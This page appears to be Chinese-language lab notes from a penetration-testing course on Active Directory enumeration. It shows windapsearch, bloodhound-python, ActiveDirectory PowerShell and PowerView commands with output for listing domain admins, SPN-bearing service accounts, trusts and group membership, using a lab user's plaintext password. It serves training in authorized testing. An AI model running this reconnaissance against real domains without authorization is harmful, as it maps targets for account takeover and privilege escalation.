<h2 id="5-Windapsearch"><a href="#5-Windapsearch" class="headerlink" title="5. Windapsearch"></a>5. Windapsearch</h2><h3 id="Windapsearch-域管理员-特权用户"><a href="#Windapsearch-域管理员-特权用户" class="headerlink" title="Windapsearch - 域管理员&#x2F;特权用户"></a>Windapsearch - 域管理员&#x2F;特权用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]	Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting <span class="built_in">bind</span></span><br><span class="line">[+]	...success! Binded as: </span><br><span class="line">[+]	 u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all Domain Admins</span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]	Found 28 Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]     Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting <span class="built_in">bind</span></span><br><span class="line">[+]     ...success! Binded as:</span><br><span class="line">[+]      u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all AD privileged <span class="built_in">users</span></span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 28 nested <span class="built_in">users</span> <span class="keyword">for</span> group Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Angela Dunn</span><br><span class="line">userPrincipalName: adunn@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Dorothy Click</span><br><span class="line">userPrincipalName: dclick@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 3 nested <span class="built_in">users</span> <span class="keyword">for</span> group Enterprise Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Sharepoint Admin</span><br><span class="line">userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="6-BloodHound-py"><a href="#6-BloodHound-py" class="headerlink" title="6. BloodHound.py"></a>6. BloodHound.py</h2><h3 id="执行-BloodHound-py"><a href="#执行-BloodHound-py" class="headerlink" title="执行 BloodHound.py"></a>执行 BloodHound.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo bloodhound-python -u <span class="string">&#x27;forend&#x27;</span> -p <span class="string">&#x27;Klmcargo2&#x27;</span> -ns 172.16.5.5 -d inlanefreight.local -c all </span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 564 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 2951 <span class="built_in">users</span></span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="7-ActiveDirectory-PowerShell-模块"><a href="#7-ActiveDirectory-PowerShell-模块" class="headerlink" title="7. ActiveDirectory PowerShell 模块"></a>7. ActiveDirectory PowerShell 模块</h2><h3 id="发现模块"><a href="#发现模块" class="headerlink" title="发现模块"></a>发现模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...</span><br></pre></td></tr></table></figure>

<h3 id="加载-ActiveDirectory-模块"><a href="#加载-ActiveDirectory-模块" class="headerlink" title="加载 ActiveDirectory 模块"></a>加载 ActiveDirectory 模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">1.0</span>.<span class="number">1.0</span>    ActiveDirectory                     &#123;<span class="built_in">Add-ADCentralAccessPolicyMember</span>, <span class="built_in">Add-ADComputerServiceAcc</span>...</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...</span><br></pre></td></tr></table></figure>

<h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADDomain</span></span><br><span class="line"></span><br><span class="line">AllowedDNSSuffixes                 : &#123;&#125;</span><br><span class="line">ChildDomains                       : &#123;LOGISTICS.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DNSRoot                            : INLANEFREIGHT.LOCAL</span><br><span class="line">DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DomainMode                         : Windows2016Domain</span><br><span class="line">DomainSID                          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114</span></span><br><span class="line">ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Forest                             : INLANEFREIGHT.LOCAL</span><br><span class="line">InfrastructureMaster               : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">LastLogonReplicationInterval       :</span><br><span class="line">LinkedGroupPolicyObjects           : &#123;cn=&#123;DDBB8574<span class="literal">-E94E-4525-8C9D-ABABE31223D0</span>&#125;,cn=policies,cn=system,DC=INLANEFREIGHT,</span><br><span class="line">                                     DC=LOCAL, CN=&#123;<span class="number">31</span>B2F340<span class="literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=INLAN</span><br><span class="line">                                     EFREIGHT,DC=LOCAL&#125;</span><br><span class="line">LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ManagedBy                          :</span><br><span class="line">Name                               : INLANEFREIGHT</span><br><span class="line">NetBIOSName                        : INLANEFREIGHT</span><br><span class="line">ObjectClass                        : domainDNS</span><br><span class="line">ObjectGUID                         : <span class="number">71</span>e4ecd1<span class="literal">-a9f6-4f55-8a0b-e8c398fb547a</span></span><br><span class="line">ParentDomain                       :</span><br><span class="line">PDCEmulator                        : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">PublicKeyRequiredPasswordRolling   : True</span><br><span class="line">QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ReadOnlyReplicaDirectoryServers    : &#123;&#125;</span><br><span class="line">ReplicaDirectoryServers            : &#123;ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">RIDMaster                          : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">SubordinateReferences              : &#123;DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL&#125;</span><br><span class="line">SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br></pre></td></tr></table></figure>

<h3 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span>&#125; <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Sharepoint</span><br><span class="line">Name                 : adfs</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">49</span>b53bea<span class="literal">-4bc4-4a68-b694-b806d9809e95</span></span><br><span class="line">SamAccountName       : adfs</span><br><span class="line">ServicePrincipalName : &#123;adfsconnect/azure01.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5244</span></span><br><span class="line">Surname              : Admin</span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Jessica</span><br><span class="line">Name                 : BACKUPAGENT</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName       : backupagent</span><br><span class="line">ServicePrincipalName : &#123;backupjob/veam001.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br><span class="line">Surname              : Systemmailbox <span class="number">8</span>Cc370d3<span class="literal">-822A-4Ab8-A926-Bb94bd0641a9</span></span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="检查信任关系"><a href="#检查信任关系" class="headerlink" title="检查信任关系"></a>检查信任关系</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False  </span><br></pre></td></tr></table></figure>

<h3 id="组枚举"><a href="#组枚举" class="headerlink" title="组枚举"></a>组枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> * | <span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Administrators</span><br><span class="line">Users</span><br><span class="line">Guests</span><br><span class="line">Print Operators</span><br><span class="line">Backup Operators</span><br><span class="line">Replicator</span><br><span class="line">Remote Desktop Users</span><br><span class="line">Network Configuration Operators</span><br><span class="line">Performance Monitor Users</span><br><span class="line">Performance Log Users</span><br><span class="line">Distributed COM Users</span><br><span class="line">IIS_IUSRS</span><br><span class="line">Cryptographic Operators</span><br><span class="line">Event Log Readers</span><br><span class="line">Certificate Service DCOM Access</span><br><span class="line">RDS Remote Access Servers</span><br><span class="line">RDS Endpoint Servers</span><br><span class="line">RDS Management Servers</span><br><span class="line">Hyper<span class="literal">-V</span> Administrators</span><br><span class="line">Access Control Assistance Operators</span><br><span class="line">Remote Management Users</span><br><span class="line">Storage Replica Administrators</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Cert Publishers</span><br><span class="line">Domain Admins</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="详细组信息"><a href="#详细组信息" class="headerlink" title="详细组信息"></a>详细组信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">GroupCategory     : Security</span><br><span class="line">GroupScope        : DomainLocal</span><br><span class="line">Name              : Backup Operators</span><br><span class="line">ObjectClass       : <span class="built_in">group</span></span><br><span class="line">ObjectGUID        : <span class="number">6276</span>d85d<span class="literal">-9c39-4b7c-8449-cad37e8abc38</span></span><br><span class="line">SamAccountName    : Backup Operators</span><br><span class="line">SID               : S<span class="literal">-1-5-32-551</span></span><br></pre></td></tr></table></figure>

<h3 id="组成员身份"><a href="#组成员身份" class="headerlink" title="组成员身份"></a>组成员身份</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">name              : BACKUPAGENT</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName    : backupagent</span><br><span class="line">SID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br></pre></td></tr></table></figure>

<h2 id="8-PowerView"><a href="#8-PowerView" class="headerlink" title="8. PowerView"></a>8. PowerView</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Export-PowerViewCSV</code></td>
<td>将结果追加到 CSV 文件</td>
</tr>
<tr>
<td><code>ConvertTo-SID</code></td>
<td>将用户或组名转换为其 SID 值</td>
</tr>
<tr>
<td><code>Get-DomainSPNTicket</code></td>
<td>请求指定服务主体名称（SPN）账户的 Kerberos 票据</td>
</tr>
<tr>
<td><strong>域&#x2F;LDAP 功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-Domain</code></td>
<td>将返回当前（或指定）域的 AD 对象</td>
</tr>
<tr>
<td><code>Get-DomainController</code></td>
<td>返回指定域的域控制器列表</td>
</tr>
<tr>
<td><code>Get-DomainUser</code></td>
<td>将返回所有用户或 AD 中的特定用户对象</td>
</tr>
<tr>
<td><code>Get-DomainComputer</code></td>
<td>将返回 AD 中的所有计算机或特定计算机对象</td>
</tr>
<tr>
<td><code>Get-DomainGroup</code></td>
<td>将返回 AD 中的所有组或特定组对象</td>
</tr>
<tr>
<td><code>Get-DomainOU</code></td>
<td>在 AD 中搜索所有或特定 OU 对象</td>
</tr>
<tr>
<td><code>Find-InterestingDomainAcl</code></td>
<td>查找域中对象 ACL，其修改权限设置为非内置对象</td>
</tr>
<tr>
<td><code>Get-DomainGroupMember</code></td>
<td>将返回特定域组的成员</td>
</tr>
<tr>
<td><code>Get-DomainFileServer</code></td>
<td>返回可能作为文件服务器运行的服务器列表</td>
</tr>
<tr>
<td><code>Get-DomainDFSShare</code></td>
<td>返回当前（或指定）域中所有分布式文件系统的列表</td>
</tr>
<tr>
<td><strong>GPO 功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainGPO</code></td>
<td>将返回所有 GPO 或 AD 中的特定 GPO 对象</td>
</tr>
<tr>
<td><code>Get-DomainPolicy</code></td>
<td>返回当前域的默认域策略或域控制器策略</td>
</tr>
<tr>
<td><strong>计算机枚举函数：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-NetLocalGroup</code></td>
<td>枚举本地或远程机器上的本地组</td>
</tr>
<tr>
<td><code>Get-NetLocalGroupMember</code></td>
<td>枚举特定本地组的成员</td>
</tr>
<tr>
<td><code>Get-NetShare</code></td>
<td>返回本地（或远程）计算机上的开放共享</td>
</tr>
<tr>
<td><code>Get-NetSession</code></td>
<td>将返回本地（或远程）计算机的会话信息</td>
</tr>
<tr>
<td><code>Test-AdminAccess</code></td>
<td>测试当前用户是否具有对本地（或远程）计算机的管理员访问权限</td>
</tr>
<tr>
<td><strong>线程化“元”函数：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Find-DomainUserLocation</code></td>
<td>查找特定用户登录的机器</td>
</tr>
<tr>
<td><code>Find-DomainShare</code></td>
<td>查找域内机器的可访问共享</td>
</tr>
<tr>
<td><code>Find-InterestingDomainShareFile</code></td>
<td>在域内可读共享中搜索符合特定条件的文件</td>
</tr>
<tr>
<td><code>Find-LocalAdminAccess</code></td>
<td>查找当前用户在本地域中具有本地管理员访问权限的机器</td>
</tr>
<tr>
<td><strong>域信任功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainTrust</code></td>
<td>返回当前域或指定域的域信任关系</td>
</tr>
<tr>
<td><code>Get-ForestTrust</code></td>
<td>返回当前林或指定林的所有林信任</td>
</tr>
<tr>
<td><code>Get-DomainForeignUser</code></td>
<td>枚举位于用户域之外组中的用户</td>
</tr>
<tr>
<td><code>Get-DomainForeignGroupMember</code></td>
<td>枚举包含非组所在域用户的组，并返回每个外部成员</td>
</tr>
<tr>
<td><code>Get-DomainTrustMapping</code></td>
<td>将枚举当前域及其可见的所有其他域的所有信任关系。</td>
</tr>
</tbody></table>
